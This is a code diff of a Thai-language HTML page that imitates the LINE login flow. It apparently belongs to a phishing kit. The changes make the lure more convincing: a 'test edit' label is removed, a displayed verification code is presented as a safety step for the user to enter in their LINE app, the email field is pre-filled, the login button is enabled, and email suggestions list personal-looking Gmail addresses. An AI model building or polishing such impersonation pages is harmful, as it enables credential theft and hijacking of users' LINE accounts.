@@ -274,15 +274,13 @@
         <!-- หน้ารหัสยืนยันตัวตน -->
         <div id="verification-page">
             <div class="logo">LINE</div>
-            <h1 class="title" id="verification-title">รหัสยืนยันตัวตน - ทดสอบการแก้ไข</h1>
-            <p class="subtitle" id="verification-subtitle">กรุณาใส่รหัสยืนยันตัวตนที่ส่งไปยัง LINE อย่างน้อย 4 ตัวอักษร</p>
+            <h1 class="title" id="verification-title">รหัสยืนยันตัวตน</h1>
+            <p class="subtitle" id="verification-subtitle">กรุณาใช้รหัสยืนยันตัวตนด้านล่างเพื่อใช้งาน LINE อย่างปลอดภัย</p>
             
-            <div class="verification-code" id="verification-code">1868</div>
-            <div class="timer" id="timer">เหลือเวลา: 02:59</div>
+            <div class="verification-code" id="verification-code">5272</div>
+            <div class="timer" id="timer">เหลือเวลา: 02:53</div>
             
             <p class="help-text">โปรดใส่รหัสยืนยันตัวตนแอป LINE<br>สำหรับมือถือใหม่ให้ใหม่</p>
-            
-            <button class="btn btn-primary" onclick="submitVerification()">เข้าสู่ระบบด้วยรหัสยืนยัน</button>
             
             <div class="link-section">
                 <a href="#" onclick="goToQRPage()" class="link-text">เข้าสู่ระบบด้วยคิวอาร์โค้ด</a>
@@ -294,8 +292,7 @@
             <div class="logo">LINE</div>
             
             <div class="form-group">
-                <label class="form-label" id="email-label">อีเมล</label>
-                <input type="email" class="form-input" id="email-input" placeholder="อีเมล" 
+                <input type="email" class="form-input" id="email-input" placeholder="bn9.club@gmail.com" 
                        onfocus="showEmailSuggestions()" onblur="hideEmailSuggestions()">
                 <div id="email-suggestions" class="email-suggestions hidden">
                     <div class="email-suggestion" onclick="selectEmail('sareingsaehx@gmail.com')">sareingsaehx@gmail.com</div>
@@ -305,11 +302,10 @@
             </div>
             
             <div class="form-group">
-                <label class="form-label" id="password-label">รหัสผ่าน</label>
-                <input type="password" class="form-input" id="password-input" placeholder="รหัสผ่าน">
+                <input type="password" class="form-input" id="password-input" placeholder="••••••••">
             </div>
             
-            <button class="btn btn-disabled" id="login-btn" onclick="goToFormPage()">เข้าสู่ระบบ</button>
+            <button class="btn btn-primary" id="login-btn" onclick="goToFormPage()">เข้าสู่ระบบ</button>
             
             <div class="divider">
                 <span>เข้าสู่ระบบด้วยคิวอาร์โค้ด</span>
